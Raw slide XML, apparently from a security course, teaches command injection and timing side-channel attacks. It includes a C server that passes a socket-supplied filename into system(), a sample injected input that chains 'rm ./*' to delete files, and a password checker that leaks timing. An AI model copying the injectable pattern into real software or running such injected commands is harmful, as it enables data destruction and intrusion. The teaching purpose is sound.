          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Times" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>void main(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0" err="1">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0" err="1">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>argc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>, char ** </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0" err="1">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>argv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Times" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>	char </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0" err="1">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>buf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>[1024];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Times" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>	char* filename = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>get_str_from_socket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" kern="1200" dirty="0">
              <a:latin typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Times" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t> 	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0" err="1">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>sprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0" err="1">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>buf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>cat %s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>filename</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Times" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t> 	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>output_socket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>system (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0" err="1">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>buf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Times" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 3"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5849718" y="3931940"/>
            <a:ext cx="3199636" cy="1233312"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln/>
          <a:extLst>
            <a:ext uri="{FAA26D3D-D897-4be2-8F04-BA451C77F1D7}">
              <ma14:placeholderFlag xmlns="" xmlns:ma14="http://schemas.microsoft.com/office/mac/drawingml/2011/main" val="1"/>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prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>%telnet server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" charset="0"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>homework1.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" charset="0"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Question1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" charset="0"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>….</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" charset="0"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" kern="1200" dirty="0">
              <a:latin typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 3"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5849718" y="5256597"/>
            <a:ext cx="3199636" cy="1233312"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln/>
          <a:extLst>
            <a:ext uri="{FAA26D3D-D897-4be2-8F04-BA451C77F1D7}">
              <ma14:placeholderFlag xmlns="" xmlns:ma14="http://schemas.microsoft.com/office/mac/drawingml/2011/main" val="1"/>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prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" kern="1200" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>%telnet server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" charset="0"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>homework1.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>rm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t> ./*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" charset="0"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Question1…..</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" charset="0"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>(all files are deleted)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" kern="1200" dirty="0">
              <a:latin typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" charset="0"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" kern="1200" dirty="0">
              <a:latin typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Slide Number Placeholder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>4</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="325994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Vulnerability</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="785873" y="1242614"/>
            <a:ext cx="8229600" cy="903054"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>The timing of a program leaks sensitive information. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="Group 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="131228" y="1847431"/>
            <a:ext cx="3767587" cy="4249190"/>
            <a:chOff x="151833" y="2683417"/>
            <a:chExt cx="3864850" cy="4249190"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="322868" y="3239288"/>
              <a:ext cx="3693815" cy="369331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urier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>Boolean check(String x){</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>pwd</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t> = “</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>ohmekciziks</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>”;</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>len</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t> = </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>pwd.len</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>();</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	if(</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>x.len</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>() != </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>len</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>)</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>		return false; </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>i</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t> = 0; </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	while(x[</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>i</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>] == </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>pwd</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>[</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>i</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>]){</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>		if(</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>i</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t> == (</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>len</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t> -1))</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>			return true;</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>		</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>i</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>++; </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	}</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>	return false; </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Courier"/>
                  <a:cs typeface="Courier"/>
                </a:rPr>
                <a:t>}</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="TextBox 5"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="151833" y="2683417"/>
              <a:ext cx="3296057" cy="369332"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0"/>
                <a:t>A password verification program.</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4033685" y="2864030"/>
            <a:ext cx="4948148" cy="1107996"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                             </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Attacker</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Capability</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>: password is composed of chars (26);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>		can identify the time-consumption/CPU-cycles   </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Objective</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>:  obtain password</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4033685" y="4527447"/>
            <a:ext cx="5081965" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                             </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Brute Force Attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Try all the possible combination of chars.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>How many times do you need to try (if the attacker knows that the length of the password is 11)? </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>26 * 26 * ….. 26 =&gt; 26^11</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>5</a:t>
            </a:fld>
